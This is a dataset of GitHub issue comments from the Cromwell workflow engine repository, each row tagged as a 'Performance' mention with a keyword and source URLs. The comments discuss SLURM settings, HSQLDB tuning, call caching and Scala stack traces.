Performance,"Yes, I am using Cromwell on SLURM. The significant changes since the completed pull request for the SLURM configuration have been; 1. addition of `script-epilogue = """"` to eliminate the sync behavior after completing tasks. Sync caused some jobs to wait beyond their runtime limits for the sync to complete. ; 2. `concurrent-job-limit` to limit number of jobs submitted to scheduler. The HMS staff will kill all jobs if you submit lots (many hundreds?) of jobs that complete too quickly (<1min) because this creates a bottleneck at the scheduler. `concurrent-job-limit` obviates the need to substantially rewrite the workflow, and in my case contention with other users usually limits the number of compute nodes available more than `concurrent-job-limit`. . #1499 was a problem during pipeline development, and as a result I use very generous runtime limits for all jobs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1750#issuecomment-328217401:314,concurren,concurrent-job-limit,314,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1750#issuecomment-328217401,4,"['bottleneck', 'concurren']","['bottleneck', 'concurrent-job-limit']"
Performance,"Yes, but as pointed out in the summary above https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-328880929, `isAlive` is a much more expensive check than looking at the filesystem and calling it at the same frequency won't scale to thousands of concurrent jobs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-380991110:261,concurren,concurrent,261,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-380991110,1,['concurren'],['concurrent']
Performance,"Yes, it is still being developed and the first target is a high-throughput Cromwell that is used internally at Broad Institute. Once we get things working and suitable for end-users we will make it an official, documented feature.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4842#issuecomment-487684967:64,throughput,throughput,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4842#issuecomment-487684967,1,['throughput'],['throughput']
Performance,"Yes. On Fri, Apr 28, 2017 at 12:27 PM, Thib <notifications@github.com> wrote:. > Are those ""queue in cromwell"" part of a subworkflow ?; >; > —; > You are receiving this because you authored the thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2216#issuecomment-298043978>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXkzhPtkBvD1-WA1YWqvHZk5BJpFDwks5r0hNVgaJpZM4NLf9E>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 7003EB; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2216#issuecomment-298047657:92,queue,queue,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2216#issuecomment-298047657,1,['queue'],['queue']
Performance,"Yes. On Mon, Oct 29, 2018 at 10:45 AM Thib <notifications@github.com> wrote:. > Hi !; > Just to make sure I understand, are you saying that the monitoring log is; > not copied over when a call is being cached ?; >; > —; > You are receiving this because you authored the thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/4330#issuecomment-433937512>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/Ao_T2PcOQlD_TvcUcH4sutd4vJ9OdN8mks5upxSngaJpZM4X_RGI>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4330#issuecomment-433948423:202,cache,cached,202,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4330#issuecomment-433948423,1,['cache'],['cached']
Performance,You can create a new submission with the same inputs and Cromwell will read from call-cache (i.e. skip) tasks it has already done. https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/; https://support.terra.bio/hc/en-us/articles/360047664872-Call-caching-How-it-works-and-when-to-use-it,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6752#issuecomment-1116250707:86,cache,cache,86,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6752#issuecomment-1116250707,1,['cache'],['cache']
Performance,"You have the dependencies in `Call#prerequisiteCallNames`, so you certainly _could_ perform a Topological sort. But TBH a backend having a requirement for a topologically ordered list of calls seems kind of sketchy.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1214#issuecomment-236149002:84,perform,perform,84,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1214#issuecomment-236149002,1,['perform'],['perform']
Performance,You might have to lower the `range(100)` down. That was me testing my concurrent job limits...,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1461#issuecomment-248616220:70,concurren,concurrent,70,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1461#issuecomment-248616220,1,['concurren'],['concurrent']
Performance,"Your DB has become too big. This means it will take too much time to open the database and you will get connection timeouts. (These files can be multiple GBs). Here is our database setup:; ```; database {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; # See http://hsqldb.org/doc/2.0/guide/dbproperties-chapt.html; # Shutdown=false. Cromwell will shutdown the database; # hsqlldb.default_table_type=cached. By default hsqldb uses in memory tables. ; # Setting this to cache for improved memory usage.; # hsqldb.result_max_memory_rows=10000 . Limits the amount of rows in memory for temp tables; # hsqldb.tx=mvcc cromwell default. Not changing it. Not clear what this does. http://hsqldb.org/doc/guide/sessions-chapt.html#snc_tx_mvcc; # hsqldb.large_data=true. Cromwell creates huge DBs that need to be opened.; # hsqldb.applog=1. Log errors.; # hsqldb.lob_compressed=true. Compress lobs. This saves a lot of space.; # hsqldb.script_format=3. Compress script. (uses gzip internally).; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3; """"""; # Override the cromwell default of only 3 seconds (3000 milliseconds) and allow for 300s to read the database file.; connectionTimeout = 300000; numThreads = 1; }; }; ```; Please note the `connectionTimeout = 300000` where we set the connection timeout to 5 minutes. This works for most cases. On a side note: HSQLDB has got to be the worst performing embedded database designed in the history of mankind. When running a decent-sized WDL workflow it can get 30 GB in memory! When using the file-based database it still needs 2 GB in memory (on top of the 1 GB that cromwell needs) is very slow, and creates a multiple GB file database. (EDIT: I checked my multiple run 100 sample RNA-seq pipeline that ha",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-624458757:432,cache,cached,432,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-624458757,2,['cache'],"['cache', 'cached']"
Performance,[ERROR] [05/01/2017 21:06:38.897] [cromwell-system-akka.dispatchers.engine-dispatcher-86] [akka.dispatch.Dispatcher] null; java.lang.NullPointerException; at cromwell.engine.workflow.lifecycle.execution.callcaching.CallCacheWriteActor.receiver(CallCacheWriteActor.scala:17); at cromwell.engine.workflow.lifecycle.execution.callcaching.CallCacheWriteActor$$anonfun$1.apply(CallCacheWriteActor.scala:21); at cromwell.engine.workflow.lifecycle.execution.callcaching.CallCacheWriteActor$$anonfun$1.apply(CallCacheWriteActor.scala:19); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [ERROR] [05/01/2017 21:06:41.921] [cromwell-system-akka.dispatchers.engine-dispatcher-106] [akka://cromwell-system/user/cromwell-service/WorkflowManagerActor] WorkflowManagerActor Workflow; 67fdb82c-72bb-4d33-a74b-441a8db2a780 failed (during ExecutingWorkflowState): Task m2.Mutect2.M2:108:1 failed. JES error code 10. Message: 15: Gsutil failed: failed to upload logs for ,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298632400:1066,concurren,concurrent,1066,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298632400,1,['concurren'],['concurrent']
Performance,"`; 2. `Assigned new job execution tokens to the following groups: cd9b05d1: 1`; 3. `executing: squeue -u $(whoami)`; 4. `job id: 3342271`; 5. `Cromwell will watch for an rc file but will *not* double-check whether this job is actually alive (unless Cromwell restarts)`; 6. `Status change from - to Running`; 7. `Status change from Running to Done`; 8. ~~_Nothing_ - the next job is NOT started.~~ (_See my edit below_). I was under the impression through the comment from @kshakir [here](https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-328880929):. > - Currently the mechanism for ""checking if a job is done""-- in tests and main code-- is to look for rc files; > - On restart if the rc file is missing, there's a single extra check to the scheduler to see if the job is alive, by running a external command line process per job. However, when I restart a Cromwell-39 server, it calls the `check-alive` block before it checks for the RC file. It is calling the correct `squeue -j ${jobid}` (as discussed in the [doc: Slurm config](https://cromwell.readthedocs.io/en/stable/backends/SLURM/). For reference this returns:. ```; slurm_load_jobs error: Invalid job id specified; ```; I tried swapping it out for `squeue -u ${user}` (and also `-u $(whoami)`) option that @MatthewMah mentioned [here](https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-328984482) (just to cover my bases) which returns:. ```; JOBID PARTITION NAME USER ST TIME NODES NODELIST(REASON); ```. Cromwell doesn't seem to store the completed results, even though it successfully finds the RC file and marks the (samtools) task as Done, ~~as when I restarted the Cromwell server (after 20 minutes), it performed exactly the same process~~ (although still relevant, see my edit below - needed 30 minutes). ---. **Edit**: _I left the Cromwell server running for 30 minutes and it just randomly started the next job. I don't know if this is related or not, but obviously needed to update my comment._",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-487771736:2056,perform,performed,2056,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-487771736,1,['perform'],['performed']
Performance,`ConfigFactory.load()` [caches](http://typesafehub.github.io/config/latest/api/com/typesafe/config/ConfigFactory.html#load--) the config on the first call and returns the same singleton config until someone calls [invalidateCaches](http://typesafehub.github.io/config/latest/api/com/typesafe/config/ConfigFactory.html#invalidateCaches--),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/796#issuecomment-234338917:15,load,load,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/796#issuecomment-234338917,3,"['cache', 'load']","['caches', 'load']"
Performance,`SprayDockerRegistryApiClientSpec` is finicky. Should probably me marked as an `CromwellSpec.IntegrationTest`. It was already using `org.scalatest.concurrent.IntegrationPatience`.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/348#issuecomment-168885841:147,concurren,concurrent,147,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/348#issuecomment-168885841,1,['concurren'],['concurrent']
Performance,"```; Caused by: java.io.IOException: insufficient data written; #011at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); #011at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); #011at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); #011at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); #011at akka.dispatch.Mailbox.exec(Mailbox.scala:234); #011at akka.dispatch.Mailbox.run(Mailbox.scala:224); #011at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); #011at akka.actor.ActorCell.invoke(ActorCell.scala:494); #011at akka.actor.ActorCell.autoReceiveMessage(ActorCell.scala:511); #011at akka.actor.ActorCell.receivedTerminated(ActorCell.scala:374); #011at akka.actor.dungeon.DeathWatch$class.receivedTerminated(DeathWatch.scala:46); #011at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); #011at cromwell.backend.impl.jes.statuspolling.JesApiQueryManager.aroundReceive(JesApiQueryManager.scala:26); #011at akka.actor.Actor$class.aroundReceive(Actor.scala:496); #011at cromwell.backend.impl.jes.statuspolling.JesApiQueryManager$$anonfun$receive$1.applyOrElse(JesApiQueryManager.scala:51); #011at cromwell.backend.impl.jes.statuspolling.JesApiQueryManager.cromwell$backend$impl$jes$statuspolling$JesApiQueryManager$$handleTerminated(JesApiQueryManager.scala:101); #011at scala.collection.immutable.List.foreach(List.scala:381); #011at cromwell.backend.impl.jes.statuspolling.JesApiQueryManager$$anonfun$cromwell$backend$impl$jes$statuspolling$JesApiQueryManager$$handleTerminated$1.apply(JesApiQueryManager.scala:101); #011at cromwell.backend.impl.jes.statuspolling.JesApiQueryManager$$anonfun$cromwell$backend$impl$jes$statuspolling$JesApiQueryManager$$handleTerminated$1.apply(JesApiQueryManager.scala:103); cromwell.backend.impl.jes.statuspolling.JesApiQueryManager$JesApiException: Unable to complete JES Api Request; 2017-08-10 08:29:38,408 cromwell-system-akka.dispatche",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2535#issuecomment-321847390:77,concurren,concurrent,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2535#issuecomment-321847390,4,['concurren'],['concurrent']
Performance,"a worker pool is a technique where you have a fixed size pool of workers taking work off a pile instead of just doing everything the moment it wants to be done. it allows you to have better control over system resources, at the cost of needing to handle ""what happens if the pile itself consumes too many system resources?"" (the latter is one reason why you sometimes see references to things being dropped under load)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2084#issuecomment-329788962:413,load,load,413,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2084#issuecomment-329788962,1,['load'],['load']
Performance,"a]; at cromwell.engine.backend.jes.JesBackend.authenticateAsCromwell(JesBackend.scala:161) [classes/:na]; at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$createJesRun(JesBackend.scala:400) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$10.apply(JesBackend.scala:542) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$10.apply(JesBackend.scala:541) [classes/:na]; at scala.util.Success.flatMap(Try.scala:231) [scala-library-2.11.7.jar:1.0.0-M1]; at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$runWithJes(JesBackend.scala:541) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executeOrResume$1.apply(JesBackend.scala:285) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executeOrResume$1.apply(JesBackend.scala:275) [classes/:na]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) [scala-library-2.11.7.jar:na]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24) [scala-library-2.11.7.jar:na]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) [akka-actor_2.11-2.3.14.jar:na]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [akka-actor_2.11-2.3.14.jar:na]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [scala-library-2.11.7.jar:na]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [scala-library-2.11.7.jar:na]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [scala-library-2.11.7.jar:na]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [scala-library-2.11.7.jar:na]; 2015-12-21 14:05:11,207 cromwell-system-akka.actor.default-dispatcher-2 WARN - JesBackend [UUID(60f8d0d3)]: JesBackend [UUID(60f8d0d3):hello] Exception occurred while creating JES Run. Retrying in 5 seconds (9 more retries) ...; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/338#issuecomment-166392486:5049,concurren,concurrent,5049,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/338#issuecomment-166392486,5,['concurren'],['concurrent']
Performance,"a_fai,; ref_fasta_dict=ref_fasta_dict,; gatk_jar=gatk_jar,; isWGS=isWGS,; wgsBinSize=wgsBinSize,; mem=4; }. call AnnotateTargets as NormalAnnotateTargets{; input:; entity_id=row[3],; gatk_jar=gatk_jar,; target_file=NormalWholeGenomeCoverage.gatk_target_file,; ref_fasta=ref_fasta,; ref_fasta_fai=ref_fasta_fai,; ref_fasta_dict=ref_fasta_dict,; enable_gc_correction=enable_gc_correction,; mem=4; }. call CorrectGCBias as NormalCorrectGCBias {; input:; entity_id=row[3],; gatk_jar=gatk_jar,; coverage_file=NormalWholeGenomeCoverage.gatk_coverage_file,; annotated_targets=NormalAnnotateTargets.annotated_targets,; enable_gc_correction=enable_gc_correction,; mem=4; }. call NormalizeSomaticReadCounts as NormalNormalizeSomaticReadCounts {; input:; entity_id=row[3],; coverage_file=NormalCorrectGCBias.gatk_cnv_coverage_file_gcbias,; padded_target_file=NormalWholeGenomeCoverage.gatk_target_file,; pon=PoN,; gatk_jar=gatk_jar,; mem=2; }. call PerformSegmentation as NormalPerformSeg {; input:; entity_id=row[3],; gatk_jar=gatk_jar,; tn_file=NormalNormalizeSomaticReadCounts.tn_file,; seg_param_alpha=seg_param_alpha,; seg_param_nperm=seg_param_nperm,; seg_param_pmethod=seg_param_pmethod,; seg_param_minWidth=seg_param_minWidth,; seg_param_kmax=seg_param_kmax,; seg_param_nmin=seg_param_nmin,; seg_param_eta=seg_param_eta,; seg_param_trim=seg_param_trim,; seg_param_undoSplits=seg_param_undoSplits,; seg_param_undoPrune=seg_param_undoPrune,; seg_param_undoSD=seg_param_undoSD,; mem=2; }. call Caller as NormalCaller {; input:; entity_id=row[3],; gatk_jar=gatk_jar,; tn_file=NormalNormalizeSomaticReadCounts.tn_file,; seg_file=NormalPerformSeg.seg_file,; mem=2; }; }; }. # Pad the target file. This was found to help sensitivity and specificity. This step should only be altered; # by advanced users. Note that by changing this, you need to have a PoN that also reflects the change.; task PadTargets {; File target_file; Int padding = 250; String gatk_jar; Boolean isWGS; Int mem. # Note that when isWGS is ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1488#issuecomment-249696151:7689,Perform,PerformSegmentation,7689,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1488#issuecomment-249696151,1,['Perform'],['PerformSegmentation']
Performance,"ached. By default hsqldb uses in memory tables. ; # Setting this to cache for improved memory usage.; # hsqldb.result_max_memory_rows=10000 . Limits the amount of rows in memory for temp tables; # hsqldb.tx=mvcc cromwell default. Not changing it. Not clear what this does. http://hsqldb.org/doc/guide/sessions-chapt.html#snc_tx_mvcc; # hsqldb.large_data=true. Cromwell creates huge DBs that need to be opened.; # hsqldb.applog=1. Log errors.; # hsqldb.lob_compressed=true. Compress lobs. This saves a lot of space.; # hsqldb.script_format=3. Compress script. (uses gzip internally).; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3; """"""; # Override the cromwell default of only 3 seconds (3000 milliseconds) and allow for 300s to read the database file.; connectionTimeout = 300000; numThreads = 1; }; }; ```; Please note the `connectionTimeout = 300000` where we set the connection timeout to 5 minutes. This works for most cases. On a side note: HSQLDB has got to be the worst performing embedded database designed in the history of mankind. When running a decent-sized WDL workflow it can get 30 GB in memory! When using the file-based database it still needs 2 GB in memory (on top of the 1 GB that cromwell needs) is very slow, and creates a multiple GB file database. (EDIT: I checked my multiple run 100 sample RNA-seq pipeline that has run multiple times, using call-caching and sometimes with slightly different settings: **85 GB** in files for the database.); MySQL performs much better with cromwell, but is infeasible to use in a per-project, per-user fashion. [I am working on solving the problem using SQLite](https://github.com/broadinstitute/cromwell/issues/5490) but there is NO ETA, and I don't know if I will ever get it to work. Still it is worth trying.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-624458757:1638,perform,performing,1638,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-624458757,2,['perform'],"['performing', 'performs']"
Performance,ackend Error; 	at com.google.cloud.storage.spi.DefaultStorageRpc.translate(DefaultStorageRpc.java:190); 	at com.google.cloud.storage.spi.DefaultStorageRpc.read(DefaultStorageRpc.java:482); 	at com.google.cloud.storage.BlobReadChannel$1.call(BlobReadChannel.java:127); 	at com.google.cloud.storage.BlobReadChannel$1.call(BlobReadChannel.java:124); 	at com.google.cloud.RetryHelper.doRetry(RetryHelper.java:179); 	at com.google.cloud.RetryHelper.runWithRetries(RetryHelper.java:244); 	at com.google.cloud.storage.BlobReadChannel.read(BlobReadChannel.java:124); 	at com.google.cloud.storage.contrib.nio.CloudStorageReadChannel.read(CloudStorageReadChannel.java:85); 	at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:65); 	at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:109); 	at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:103); 	at java.nio.file.Files.read(Files.java:3105); 	at java.nio.file.Files.readAllBytes(Files.java:3158); 	at better.files.File.loadBytes(File.scala:163); 	at better.files.File.byteArray(File.scala:166); 	at better.files.File.contentAsString(File.scala:206); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents$1.apply(JesAsyncBackendJobExecutionActor.scala:110); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents$1.apply(JesAsyncBackendJobExecutionActor.scala:110); 	at scala.util.Try$.apply(Try.scala:192); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents$lzycompute(JesAsyncBackendJobExecutionActor.scala:110); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents(JesAsyncBackendJobExecutionActor.scala:110); 	at cromwell.backend.impl.jes.JesAsyncBack,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1782#issuecomment-267025762:1146,load,loadBytes,1146,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1782#issuecomment-267025762,1,['load'],['loadBytes']
Performance,ackend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:695); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.$anonfun$handleExecutionFailure$1(PipelinesApiAsyncBackendJobExecutionActor.scala:707); 	at scala.util.Try$.apply(Try.scala:213); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:704); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:92); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1258); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1254); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:417); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:41); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:92); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJ,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-680258929:2645,concurren,concurrent,2645,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-680258929,1,['concurren'],['concurrent']
Performance,"actQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); ....snip.... ""ForkJoinPool-2-worker-29"" #38 daemon prio=5 os_prio=0 tid=0x00007fdaf4001000 nid=0xa0e waiting on condition [0x00007fdb8073c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b540500> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""db-1"" #37 daemon prio=5 os_prio=0 tid=0x00007fdaf833e800 nid=0xa0d waiting on condition [0x00007fdb80ad0000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b76aed8> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.j",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:3493,concurren,concurrent,3493,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
